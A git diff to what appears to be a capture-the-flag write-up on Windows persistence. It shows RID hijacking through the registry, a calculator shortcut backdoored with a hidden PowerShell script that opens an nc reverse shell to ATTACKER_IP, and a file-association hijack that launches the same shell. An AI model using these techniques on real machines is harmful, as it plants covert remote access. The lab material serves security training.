@@ -8,7 +8,7 @@ After gaining initial foothold into a machine, we need to find a way to regain t
 
 --- 
 
-## Task 2; Tampering With Unprivileged Accounts
+## Task 2: Tampering With Unprivileged Accounts
 
 
 ### Assign Group Memberships
@@ -149,13 +149,84 @@ C:\tools\pstools> PsExec64.exe -i -s regedit
 This will open a registry editor and go to ```HKLM\SAM\SAM\Domains\Account\Users\``` 
 
 Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). 
-** TO GET RID ``` wmic useraccount get name,sid ```**
+
+* TO GET RID ``` wmic useraccount get name,sid ```
+
 <img width="840" height="526" alt="image" src="https://github.com/user-attachments/assets/76a1a302-e2da-4e4a-948a-8647b342968d" />
 
 Notice the RID is stored using little-endian notation, so its bytes appear reversed.
 
 We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
 <img width="597" height="317" alt="image" src="https://github.com/user-attachments/assets/346fbc1b-49c4-423c-a58b-544a72aec3cb" />
+
+Now we connect via RDP (Remmina or any other RDP of your choice)
+
+```bash
+c:\tools\pstools>C:\flags\flag3.exe
+THM{REDACTED!!!}
+```
+
+Q3. <img width="1383" height="108" alt="Screenshot 2025-10-21 at 2 46 29 in the afternoon" src="https://github.com/user-attachments/assets/7004d5e7-f003-4196-8811-e7d95aa049c0" />
+
+--- 
+
+## Task 3: Backdooring Files
+
+Another common method to gain access is through tampering with commonly used files
+
+### Shortcut Files
+
+Let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties, and save it to ```backdoor.ps1``` file:
+
+```bash
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+C:\Windows\System32\calc.exe
+```
+
+Go to properties of calc on the Desktop
+Change target to ```powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1```
+
+Start nc listener on attacker's machine by ```nc -lvp 4445```
+We should get the flag
+```bash
+C:\Users\Administrator>C:\flags\flag5.exe
+C:\flags\flag5.exe
+THM{REDACTED!!!}
+```
+Q1. 
+
+<img width="627" height="99" alt="Screenshot 2025-10-21 at 3 28 53 in the afternoon" src="https://github.com/user-attachments/assets/6d3f4708-c73b-45ca-bd08-d013ab5c07e3" />
+
+### Hijacking File Associations
+
+Create a powershell file called backdoor2.ps1:
+```bash
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+```
+
+Go to Registry Editor and search for ```HKLM\Software\Classes\shell\open\command```
+<img width="754" height="271" alt="image" src="https://github.com/user-attachments/assets/c6b0fa0f-c995-41ba-91a2-330321090790" />
+
+Change the value of the data to 
+```bash
+powershell -windowstyle hidden C:\windows\backdoor2.ps1
+```
+Start nc listener on attacker's machine by ```nc -lvp 4448```
+We should get the flag
+```bash
+C:\Windows\system32>C:\flags\flag6.exe
+C:\flags\flag6.exe
+THM{REDACTED!!!}
+```
+Q2. 
+
+<img width="637" height="104" alt="Screenshot 2025-10-21 at 4 24 54 in the afternoon" src="https://github.com/user-attachments/assets/e90587e8-b34e-4cb7-831d-6ae348a0f0b0" />
+
+
+
+
+
 
 
 
